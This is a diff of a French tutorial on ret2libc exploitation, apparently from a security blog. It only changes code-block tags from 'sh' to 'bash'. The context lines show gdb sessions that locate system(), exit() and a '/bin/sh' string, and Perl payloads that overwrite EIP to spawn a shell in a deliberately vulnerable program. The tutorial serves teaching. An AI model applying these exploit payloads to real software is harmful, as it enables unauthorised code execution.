@@ -33,7 +33,7 @@ Certaines protections existent pour se protéger des buffer overflows. Une des p
 
 Voici une commande permettant de connaitre les flags de la pile :
 
-```sh
+```bash
 $ readelf -l add32 | grep GNU_STACK
 
 Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
@@ -74,7 +74,7 @@ int main(void) {
 
 Ce programme lance la commande system(), avec en argument la chaine de caractères `"/bin/sh"`. Si nous le compilons et le désassemblons au sein de gdb, voici le résultat obtenu
 
-```sh
+```bash
 $ gcc -m32 appel_system.c -o appel_system
 $ gdb appel_system
 gdb$ disass main
@@ -96,7 +96,7 @@ End of assembler dump.
 
 Nous voyons le call vers la fonction system() à la ligne +32. Aux lignes +9 et +17, nous voyons que notre chaine de caractères `"/bin/sh"`; est enregistrée à esp+0x18, sachant que 0x6e69622f est la représentation ASCII de `/bin`; et 0x68732f de `/sh`; (en Little Endian). Ensuite, à la ligne +25, l'adresse valant esp+0x18 est placée dans EAX, puis EAX est mis au sommet de la pile, pointé par ESP. Donc si nous plaçons un breakpoint sur le call, nous devrions voir notre chaine de caractères sur le sommet de la pile :
 
-```sh
+```bash
 gdb$ b *0x0804843c
 Breakpoint 1 at 0x804843c
 gdb$ r
@@ -147,7 +147,7 @@ JMP <adresse>
 Vous vous doutiez sûrement du fait qu'un JMP était effectué, puisque l’instruction qui sera exécutée juste après est celle située à l'adresse fournie au call, cependant, il ne faut surtout pas oublier que EIP est poussé sur la pile afin de retenir l'instruction qui suivait le call, instruction qui sera remise dans EIP à la fin de la fonction appelée. Pour en avoir le cœur net, vérifions-le dans gdb. Retenons dans un coin de notre tête l'adresse de l'instruction qui suit le call system (0x8048441)
 
 
-```sh
+```bash
 gdb$ si
 [...]
 0x08048300 in system@plt ()
@@ -229,7 +229,7 @@ int main(int argc, char *argv[])
 Ce code est le même que celui fourni en exemple dans le deuxième cas pratique de l'article sur les [buffer overflows](/buffer-overflow). Voici le comportement attendu de ce programme :
 
 
-```sh
+```bash
 $ ./ret2libc hackndo
 hackndo
 $ ./ret2libc hackndoisawesome
@@ -241,7 +241,7 @@ Segmentation fault
 Je ne vais pas revenir sur les bases de l'overflow expliquées dans les articles précédents. Dans gdb, nous trouvons le nombre exact de caractères à envoyer pour réécrire EIP
 
 
-```sh
+```bash
 gdb$ r $(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"')
 AAAAAAAAAAAAAAAAAAAAﾭ�
 
@@ -267,7 +267,7 @@ Rappelons que nous voulons mettre la stack dans l'état suivant :
 Nous venons de trouver l'adresse de la sauvegarde de `EIP`, il s'agit maintenant de trouver l'adresse de la fonction `system()`.  Pour cela, rien de plus simple, il suffit de lancer la commande `print system` ou `p system` dans gdb
 
 
-```sh
+```bash
 gdb$ p system
 $1 = {<text variable, no debug info>} 0xb7ea9e20 <system>
 ```
@@ -279,7 +279,7 @@ L'adresse de la fonction `system` est donc `0xb7ea9e20`.
 Vient alors le tour de la chaine de caractère `"/bin/sh"`. Dans un premier temps, il peut être possible de trouver cette chaine de caractères de manière un peu brutale mais rapide (merci <strong>Mastho</strong> pour l'astuce !), via la commande suivante dans gdb :
 
 
-```sh
+```bash
 (gdb) find __libc_start_main,+99999999,"/bin/sh"
 0xb7fa92e8
 warning: Unable to access target memory at 0xb7fd03f0, halting search.
@@ -290,7 +290,7 @@ warning: Unable to access target memory at 0xb7fd03f0, halting search.
 Cette commande effectue une recherche dans une plage mémoire commençant au début de la fonction `__libc_start_main()` (appelée avant notre fonction `main`), et d'une taille de 99 999 999 octets (Pour être sûr). Oui la méthode est violente mais elle a le mérite d'être rapide ! Nous avons donc un endroit dans la mémoire où se situe la chaine recherchée, à l'adresse `0xb7fa92e8` ! Pour nous en convaincre :
 
 
-```sh
+```bash
 (gdb) x/s 0xb7fa92e8
 0xb7fa92e8:     "/bin/sh"
 ```
@@ -302,7 +302,7 @@ Pratique non ?
 Si jamais cette chaine (ou une autre que vous recherchez) n'est pas présente dans la mémoire du binaire (par exemple la chaine `"I Love Ricard"`, au hasard, mais on va continuer avec `"/bin/sh"`), il existe divers moyens de la stocker, nous allons par exemple la stocker dans une variable d'environnement
 
 
-```sh
+```bash
 gdb$ set environment HACKNDO=/bin/sh
 gdb$ x/s *((char **) environ+7)
 0xbffff6ca:     "HACKNDO=/bin/sh"
@@ -325,7 +325,7 @@ Nous avons donc maintenant tous les éléments nécessaire pour pouvoir lancer n
 Voici le résultat :
 
 
-```sh
+```bash
 gdb$ r "$(perl -e 'print "A"x20 . "\x20\x9e\xea\xb7" . "OSEF" . "\xd2\xf6\xff\xbf"')"
 AAAAAAAAAAAAAAAAAAAA ��OSEF����
 $ 
@@ -338,7 +338,7 @@ On a obtenu notre shell ! Félicitations !
 Pour rendre cette exploitation plus propre, au lieu de mettre une adresse de retour aléatoire, nous pourrions mettre l'adresse de la fonction `exit()`. Voici rapidement comment ça se passe
 
 
-```sh
+```bash
 gdb$ r "$(perl -e 'print "A"x20 . "\x20\x9e\xea\xb7" . "OSEF" . "\xd2\xf6\xff\xbf"')"
 AAAAAAAAAAAAAAAAAAAA ��OSEF����
 
@@ -357,7 +357,7 @@ Cannot access memory at address 0x4645534f
 Cherchons alors l'adresse de `exit()`
 
 
-```sh
+```bash
 gdb$ p exit
 $3 = {<text variable, no debug info>} 0xb7e9d530 <exit>
 gdb$ r "$(perl -e 'print "A"x20 . "\x20\x9e\xea\xb7" . "\x30\xd5\xe9\xb7" . "\xd2\xf6\xff\xbf"')"
